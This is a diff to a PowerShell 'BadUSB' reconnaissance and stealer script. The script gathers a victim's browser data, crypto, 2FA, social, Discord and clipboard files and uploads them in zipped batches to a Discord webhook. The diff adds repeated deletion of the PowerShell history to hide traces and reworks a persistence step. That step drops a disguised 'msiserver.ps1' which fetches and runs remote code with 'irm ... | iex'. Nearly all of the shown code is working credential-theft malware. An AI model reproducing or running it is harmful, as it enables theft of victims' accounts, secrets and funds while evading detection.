@@ -59,6 +59,10 @@ New-Item -Path $env:tmp/$FolderName/Trees -ItemType Directory
 
 ############################################################################################################################################################
 
+# Powershell history
+Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
+
+
 # Send out started message!
 $hookurl = "$dc"
 $text = "BadUSB started on me!"
@@ -116,6 +120,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 Remove-Item "$env:TEMP\$FolderName\Streaming" -r -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\Streaming-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
 ############################################################################################################################################################
 
 New-Item -Path "$env:tmp/$FolderName/FTPandFileSync" -ItemType Directory
@@ -148,6 +156,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 Remove-Item "$env:TEMP\$FolderName\FTPandFileSync" -r -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\FTPandFileSync-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 ############################################################################################################################################################
 
@@ -192,7 +204,11 @@ $Body = @{
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
 Remove-Item "$env:TEMP\$FolderName\RemoteControl" -r -Force -ErrorAction SilentlyContinue
-#Remove-Item "$env:TEMP\RemoteControl-$ZIP" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\RemoteControl-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 ############################################################################################################################################################
 
@@ -246,6 +262,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 Remove-Item "$env:TEMP\$FolderName\TorrentsAndDownloaders" -r -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\TorrentsAndDownloaders-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 ############################################################################################################################################################
 
@@ -374,6 +394,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 Remove-Item "$env:TEMP\$FolderName\Crypto" -r -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\Crypto-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
 ############################################################################################################################################################
 
 New-Item -Path "$env:tmp/$FolderName/2FA" -ItemType Directory
@@ -421,6 +445,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 Remove-Item "$env:TEMP\$FolderName\2FA" -r -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\2FA-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
 ############################################################################################################################################################
 
 New-Item -Path "$env:tmp/$FolderName/Socials" -ItemType Directory
@@ -453,6 +481,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 Remove-Item "$env:TEMP\$FolderName\Socials" -r -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\Socials-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 ############################################################################################################################################################
 
@@ -584,6 +616,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 Remove-Item "$env:TEMP\$FolderName\Gaming" -r -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\Gaming-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
 ############################################################################################################################################################
 
 # Recon all Drives
@@ -611,8 +647,9 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 Remove-Item "$env:TEMP\$FolderName\Trees" -r -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\Trees-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
-# Powershell history
-Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 ############################################################################################################################################################
 
@@ -1015,6 +1052,10 @@ $drivers
 
 $output > $env:TEMP\$FolderName/computerData.txt
 
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
 ############################################################################################################################################################
 
 New-Item -Path "$env:tmp/$FolderName/Browsers" -ItemType Directory
@@ -1120,6 +1161,9 @@ Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\$FolderName\B
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 function chromiumBrowser {
 	
 	[CmdletBinding()]
@@ -1476,6 +1520,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 Remove-Item "$env:TEMP\$FolderName\Browsers" -r -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\Browsers-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
 ############################################################################################################################################################
 
 function discordStorage {
@@ -1527,6 +1575,10 @@ if([System.IO.File]::Exists("$env:appdata\discordptb\mute.png")){
 taskkill /IM DiscordPTB.exe /F
 discordStorage -Path "$env:appdata\discordptb" -Browser "DiscordPTB"
 }
+
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 ############################################################################################################################################################
 
@@ -1640,6 +1692,10 @@ Get-Clipboard > "$env:temp\$FolderName\Clipboard.txt";
 # Clear clipboard of image
 Set-Clipboard -Value $null
 
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
 ############################################################################################################################################################
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
@@ -1695,32 +1751,31 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
  
 # Setup Persistence if possible
 
-function Test-RegistryValue {
-
-	param (
-	
-	 [parameter(Mandatory=$true)]
-	 [ValidateNotNullOrEmpty()]$Path,
-	
-	[parameter(Mandatory=$true)]
-	 [ValidateNotNullOrEmpty()]$Value
-	)
-	
-	try {
-	
-	Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Value -ErrorAction Stop | Out-Null
-	 return $true
-	 }
-	
-	catch {
-	
-	return $false
-	
-	}
-	
-}
-
 if ($pers -eq 'True'){
+	function Test-RegistryValue {
+
+		param (
+		
+		 [parameter(Mandatory=$true)]
+		 [ValidateNotNullOrEmpty()]$Path,
+		
+		[parameter(Mandatory=$true)]
+		 [ValidateNotNullOrEmpty()]$Value
+		)
+		
+		try {
+		
+		Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Value -ErrorAction Stop | Out-Null
+		 return $true
+		 }
+		
+		catch {
+		
+		return $false
+		
+		}
+		
+	}
 	if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
 		$data = "`$dc='$dc'`$pers='$pers'irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex"
 		$data | Out-File $env:appdata+"\..\Local\msiserver.ps1"
